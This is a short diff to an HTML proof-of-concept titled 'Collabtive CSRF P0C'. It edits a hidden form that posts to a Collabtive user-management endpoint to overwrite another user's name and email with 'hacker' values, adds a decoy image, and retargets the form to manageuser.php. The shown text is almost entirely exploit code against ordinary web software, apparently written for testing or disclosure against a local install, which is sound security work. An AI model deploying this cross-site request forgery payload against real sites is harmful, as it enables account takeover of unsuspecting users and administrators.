@@ -3,7 +3,8 @@
 <title>Collabtive CSRF P0C</title>
 </head>
 <body>
-  <form method="post" action="http://localhost/collabtive/admin.php?action=edituser&id=2" enctype="multipart/form-data" name="csrfXploit">
+<img src=”https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png” />
+  <form method="post" action="http://localhost/collabtive/manageuser.php?action=profile&id=$userid&mode=edited" enctype="multipart/form-data" name="csrfXploit">
     <input type="hidden" value="hacker" name="name" />
     <input type="hidden" value="hacker@hacker" name="email" />
     <input type="hidden" value="m" name="gender" />
